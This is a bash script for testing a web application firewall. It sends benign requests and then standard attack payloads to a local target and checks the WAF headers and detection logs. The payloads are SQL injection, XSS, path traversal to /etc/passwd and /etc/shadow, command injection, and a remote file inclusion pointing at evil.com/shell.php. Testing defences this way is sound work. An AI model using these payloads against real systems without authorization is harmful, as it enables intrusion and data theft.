#!/bin/bash
# Attack demonstration script for WAF testing

set -e

echo "🎯 WAF Attack Demonstration"
echo "============================"

BASE_URL=${WAF_URL:-"http://localhost"}
API_URL=${ML_API_URL:-"http://localhost:8080"}

echo "Testing against: $BASE_URL"
echo "ML API: $API_URL"
echo

# Function to test a single request
test_request() {
    local url="$1"
    local description="$2"
    local expected="$3"

    echo "🔍 Testing: $description"
    echo "   URL: $url"

    # Make request and capture response
    response=$(curl -s -w "\nHTTP_STATUS:%{http_code}\nTOTAL_TIME:%{time_total}" "$url" 2>/dev/null || echo "ERROR")

    if [[ "$response" == *"ERROR"* ]]; then
        echo "   ❌ Request failed"
    else
        status=$(echo "$response" | grep "HTTP_STATUS:" | cut -d: -f2)
        time=$(echo "$response" | grep "TOTAL_TIME:" | cut -d: -f2)
        echo "   ✅ Status: $status | Time: ${time}s"
    fi

    # Check for WAF headers
    headers=$(curl -s -I "$url" 2>/dev/null || echo "")
    if echo "$headers" | grep -q "X-ML-Score"; then
        score=$(echo "$headers" | grep "X-ML-Score:" | cut -d: -f2 | tr -d ' \r')
        anomaly=$(echo "$headers" | grep "X-ML-Anomaly:" | cut -d: -f2 | tr -d ' \r')
        echo "   🤖 ML Score: $score | Anomaly: $anomaly"
    fi

    echo
    sleep 1
}

echo "📋 Running attack simulation scenarios..."
echo

# Benign requests
echo "✅ BENIGN REQUESTS"
echo "==================="
test_request "$BASE_URL/" "Homepage access"
test_request "$BASE_URL/login" "Login page"
test_request "$BASE_URL/api/users" "API endpoint"
test_request "$BASE_URL/profile/123" "User profile"
test_request "$BASE_URL/search?q=products" "Search functionality"

echo "🚨 MALICIOUS REQUESTS"
echo "======================"

# SQL Injection attempts
test_request "$BASE_URL/api/users?id=1%20UNION%20SELECT%20password%20FROM%20admin" "SQL Injection - UNION"
test_request "$BASE_URL/login?username=admin%27%20OR%201=1%20--%20" "SQL Injection - Authentication bypass"
test_request "$BASE_URL/search?q=test%27;%20DROP%20TABLE%20users;%20--" "SQL Injection - DROP TABLE"

# XSS attempts
test_request "$BASE_URL/search?q=%3Cscript%3Ealert(1)%3C/script%3E" "XSS - Basic script injection"
test_request "$BASE_URL/profile/123?name=javascript:alert(document.cookie)" "XSS - JavaScript URL"
test_request "$BASE_URL/comment?text=%3Cimg%20src=x%20onerror=alert(1)%3E" "XSS - Image onerror"

# Directory traversal
test_request "$BASE_URL/../etc/passwd" "Directory Traversal - /etc/passwd"
test_request "$BASE_URL/api/file?path=..%2F..%2F..%2Fetc%2Fpasswd" "Directory Traversal - URL encoded"
test_request "$BASE_URL/download?file=../../../../etc/shadow" "Directory Traversal - shadow file"

# Admin/sensitive path access
test_request "$BASE_URL/admin/delete_user?id=1" "Admin panel access"
test_request "$BASE_URL/admin/config" "Admin configuration"
test_request "$BASE_URL/phpinfo.php" "PHP info disclosure"
test_request "$BASE_URL/.env" "Environment file access"

# Command injection
test_request "$BASE_URL/ping?host=localhost;cat%20/etc/passwd" "Command Injection - cat passwd"
test_request "$BASE_URL/system?cmd=ls%20-la%20/" "Command Injection - directory listing"
test_request "$BASE_URL/exec?command=whoami" "Command Injection - whoami"

# Buffer overflow / DoS attempts
long_string=$(printf 'A%.0s' {1..500})
test_request "$BASE_URL/search?q=$long_string" "Buffer Overflow - Long query"

# File inclusion
test_request "$BASE_URL/include?file=/etc/passwd" "Local File Inclusion"
test_request "$BASE_URL/page?include=http://evil.com/shell.php" "Remote File Inclusion"

echo "📊 SUMMARY"
echo "=========="
echo "Attack simulation completed!"
echo

# Check detection log
if [ -f "logs/waf_detections.log" ]; then
    echo "🔍 Recent detections:"
    tail -n 10 logs/waf_detections.log | while read line; do
        echo "   📝 $line"
    done
elif docker exec waf-nginx test -f /var/log/waf/detections.log 2>/dev/null; then
    echo "🔍 Recent detections from Docker:"
    docker exec waf-nginx tail -n 10 /var/log/waf/detections.log | while read line; do
        echo "   📝 $line"
    done
else
    echo "⚠️  Detection log not found. Check WAF configuration."
fi

echo
echo "🎯 Demo completed! Check WAF logs for detailed detection information."
